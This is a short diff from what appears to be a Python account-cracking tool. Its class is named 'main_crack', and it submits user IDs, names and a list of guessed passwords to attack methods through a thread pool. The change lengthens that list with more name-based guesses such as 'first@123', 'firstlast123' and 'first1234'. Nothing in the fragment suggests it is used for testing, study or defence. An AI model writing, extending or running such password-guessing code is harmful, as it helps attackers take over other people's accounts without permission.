@@ -899,7 +899,7 @@ class main_crack():
                            pwx =  pw
                        else:
                             #pwx =  pw
-                            pwx =  ['first last','first1234','first123','first@123','57273200','59039200','first@12345','57575751','57575752','07860786','First Last','first@@@','first@@','first12','first@12']
+                            pwx =  ['first last','first1234','first123','first@123','57273200','59039200','first@12345','57575751','57575752','07860786','First Last','first@@@','first@@','first12','first@12','firstlast','First Last','first1','first12','first@1234','firstlast123','57232200']
                             if 'methodA' in methods:
                                 KINGworld.submit(self.methodA, uid, name, pwx)
                             elif 'methodB' in methods:
